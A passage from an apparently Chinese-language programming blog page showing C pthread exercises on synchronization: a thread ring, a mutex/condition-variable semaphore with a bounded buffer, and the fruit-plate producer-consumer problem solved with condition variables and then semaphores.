class="meta-keyword">define</span> LOOPCOUNT 25</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">add</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *num = (<span class="keyword">int</span> *)arg;</span><br><span class="line">    num[<span class="number">1</span>] = num[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *result = num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buff[N][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buff[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        buff[i][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tids[N];</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; N)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count == LOOPCOUNT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"from T[%d]"</span>,i+<span class="number">1</span>);</span><br><span class="line">        pthread_create(&amp;tids[i],<span class="literal">NULL</span>,add,(<span class="keyword">void</span> *)&amp;buff[i]);</span><br><span class="line">        pthread_join(tids[i],<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> result = buff[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        i = (i+<span class="number">1</span>) % N;</span><br><span class="line">        buff[i][<span class="number">0</span>] = result;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"to T[%d] send %d\n"</span>,i+<span class="number">1</span>,result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_CAPACITY 4</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">buffer</span>[BUFFER_CAPACITY] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> in = <span class="number">0</span>, out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">params</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> order;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line">&#125; <span class="keyword">sema_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sema_t</span> thread_mutex[N];</span><br><span class="line"><span class="keyword">sema_t</span> buffer_mutex;</span><br><span class="line"><span class="keyword">sema_t</span> buffer_full_sema, buffer_empty_sema;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_init</span><span class="params">(<span class="keyword">sema_t</span> *sema, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    sema-&gt;value = value;</span><br><span class="line">    pthread_mutex_init(&amp;sema-&gt;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;sema-&gt;cond, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_wait</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    <span class="keyword">while</span> (sema-&gt;value &lt;= <span class="number">0</span>) </span><br><span class="line">        pthread_cond_wait(&amp;sema-&gt;cond, &amp;sema-&gt;mutex);</span><br><span class="line">    sema-&gt;value--;</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_signal</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    ++sema-&gt;value;</span><br><span class="line">    pthread_cond_signal(&amp;sema-&gt;cond);</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_item</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    item = <span class="built_in">buffer</span>[out];</span><br><span class="line">    out = (out + <span class="number">1</span>) % BUFFER_CAPACITY;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_item</span><span class="params">(<span class="keyword">char</span> item)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">buffer</span>[in] = item;</span><br><span class="line">    in = (in + <span class="number">1</span>) % BUFFER_CAPACITY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">instance</span> <span class="params">(<span class="keyword">void</span> *args)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">params</span> *<span class="title">param</span> = (<span class="title">struct</span> <span class="title">params</span> *)<span class="title">args</span>;</span></span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    <span class="keyword">int</span> i = param-&gt;order;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sema_wait(&amp;thread_mutex[i]);</span><br><span class="line">        sema_wait(&amp;buffer_full_sema);</span><br><span class="line">        sema_wait(&amp;buffer_mutex);</span><br><span class="line"></span><br><span class="line">        item = get_item();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\033[0;32m%d get item: %d\033[0m\n"</span>, i+<span class="number">1</span>, item);</span><br><span class="line"></span><br><span class="line">        put_item(++item);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\033[0;31m%d put item: %d\033[0m\n"</span>, i+<span class="number">1</span>, item);</span><br><span class="line"></span><br><span class="line">        sema_signal(&amp;buffer_mutex);</span><br><span class="line">        sema_signal(&amp;buffer_full_sema);</span><br><span class="line">        sema_signal(&amp;thread_mutex[(i+<span class="number">1</span>) % N]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// The first thread</span></span><br><span class="line">        sema_wait(&amp;buffer_empty_sema);</span><br><span class="line">        sema_wait(&amp;buffer_mutex);</span><br><span class="line">        item = i + <span class="number">1</span>;</span><br><span class="line">        put_item(item);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\033[0;31m%d put item: %d\033[0m\n"</span>, i+<span class="number">1</span>, item);</span><br><span class="line">        sema_signal(&amp;buffer_mutex);</span><br><span class="line">        sema_signal(&amp;buffer_full_sema);</span><br><span class="line">        sema_signal(&amp;thread_mutex[(i+<span class="number">1</span>) % N]);</span><br><span class="line"></span><br><span class="line">        sema_wait(&amp;thread_mutex[i]);</span><br><span class="line">        sema_wait(&amp;buffer_full_sema);</span><br><span class="line">        sema_wait(&amp;buffer_mutex);</span><br><span class="line">        item = get_item();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\033[0;32m%d get item: %d\033[0m\n"</span>, i+<span class="number">1</span>, item);</span><br><span class="line">        sema_signal(&amp;buffer_mutex);</span><br><span class="line">        sema_signal(&amp;buffer_empty_sema);</span><br><span class="line">        sema_signal(&amp;thread_mutex[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread[N];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">params</span> <span class="title">params</span>[<span class="title">N</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">params</span> *<span class="title">param</span> = <span class="title">params</span>;</span></span><br><span class="line"></span><br><span class="line">    sema_init(&amp;buffer_mutex, <span class="number">1</span>);</span><br><span class="line">    sema_init(&amp;buffer_full_sema, <span class="number">0</span>);</span><br><span class="line">    sema_init(&amp;buffer_empty_sema, BUFFER_CAPACITY - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        sema_init(&amp;thread_mutex[i], <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++, param++) &#123;</span><br><span class="line">        param-&gt;order = i;</span><br><span class="line">        pthread_create(&amp;thread[i], <span class="literal">NULL</span>, instance, param);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pthread_join(thread[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="112-多消费者多生产者"><a class="markdownIt-Anchor" href="#112-多消费者多生产者"></a> 11.2 多消费者+多生产者</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//现有一个水果盘，一次只能放一个水果</span></span><br><span class="line"><span class="comment">//父亲一次向里边放一个苹果，母亲一次向里边放一个橘子</span></span><br><span class="line"><span class="comment">//儿子一次从盘中取出一个苹果，女儿一次从盘中取出一个橘子</span></span><br><span class="line"><span class="comment">//要求只能使用条件变量，不能使用环境变量</span></span><br><span class="line"><span class="comment">//输出结果为</span></span><br><span class="line"><span class="comment">//put apple</span></span><br><span class="line"><span class="comment">//get apple</span></span><br><span class="line"><span class="comment">//put orange</span></span><br><span class="line"><span class="comment">//get orange</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> plane = <span class="number">1</span>;<span class="comment">//1表示盘子空 0表示盘子满</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_apple;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_empty;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_orange;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">father_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"><span class="keyword">while</span>(plane == <span class="number">0</span>)</span><br><span class="line">pthread_cond_wait(&amp;wait_empty, &amp;mutex);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"put apple"</span>);</span><br><span class="line">pthread_cond_signal(&amp;wait_apple);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">plane = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mother_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"><span class="keyword">while</span>(plane == <span class="number">0</span>)</span><br><span class="line">pthread_cond_wait(&amp;wait_empty, &amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"put orange"</span>);</span><br><span class="line">pthread_cond_signal(&amp;wait_orange);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">plane = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">son_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"><span class="keyword">while</span>(plane == <span class="number">1</span>)</span><br><span class="line">pthread_cond_wait(&amp;wait_apple, &amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"get apple"</span>);</span><br><span class="line">pthread_cond_signal(&amp;wait_empty);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">plane = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">daughter_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"><span class="keyword">while</span>(plane == <span class="number">1</span>)</span><br><span class="line">pthread_cond_wait(&amp;wait_orange, &amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"get orange"</span>);</span><br><span class="line">pthread_cond_signal(&amp;wait_empty);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">plane = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> father_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> mother_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> son_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> daughter_thread;</span><br><span class="line"></span><br><span class="line">pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">pthread_cond_init(&amp;wait_empty, <span class="literal">NULL</span>);</span><br><span class="line">pthread_cond_init(&amp;wait_apple, <span class="literal">NULL</span>);</span><br><span class="line">pthread_cond_init(&amp;wait_orange, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;father_thread, <span class="literal">NULL</span>, &amp;father_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;mother_thread, <span class="literal">NULL</span>, &amp;mother_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;son_thread, <span class="literal">NULL</span>, &amp;son_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;daughter_thread, <span class="literal">NULL</span>, &amp;daughter_entry, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(father_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(mother_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(son_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(daughter_thread,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//while (1);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//现有一个水果盘，一次只能放一个水果</span></span><br><span class="line"><span class="comment">//父亲一次向里边放一个苹果，母亲一次向里边放一个橘子</span></span><br><span class="line"><span class="comment">//儿子一次从盘中取出一个苹果，女儿一次从盘中取出一个橘子</span></span><br><span class="line"><span class="comment">//要求只能使用条件变量，不能使用环境变量</span></span><br><span class="line"><span class="comment">//输出结果为</span></span><br><span class="line"><span class="comment">//put apple</span></span><br><span class="line"><span class="comment">//get apple</span></span><br><span class="line"><span class="comment">//put orange</span></span><br><span class="line"><span class="comment">//get orange</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int plane = 1;//1表示盘子空 0表示盘子满</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line">&#125; <span class="keyword">sema_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_init</span><span class="params">(<span class="keyword">sema_t</span> *sema, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    sema-&gt;value = value;</span><br><span class="line">    pthread_mutex_init(&amp;sema-&gt;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;sema-&gt;cond, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_wait</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    <span class="keyword">while</span> (sema-&gt;value &lt;= <span class="number">0</span>) </span><br><span class="line">        pthread_cond_wait(&amp;sema-&gt;cond, &amp;sema-&gt;mutex);</span><br><span class="line">    sema-&gt;value--;</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_signal</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    ++sema-&gt;value;</span><br><span class="line">    pthread_cond_signal(&amp;sema-&gt;cond);</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sema_t</span> mutex;</span><br><span class="line"><span class="keyword">sema_t</span> apple;</span><br><span class="line"><span class="keyword">sema_t</span> plate;</span><br><span class="line"><span class="keyword">sema_t</span> orange;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">father_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">    sema_wait(&amp;plate);</span><br><span class="line">    sema_wait(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"put apple"</span>);</span><br><span class="line"><span class="comment">// pthread_cond_signal(&amp;wait_apple);</span></span><br><span 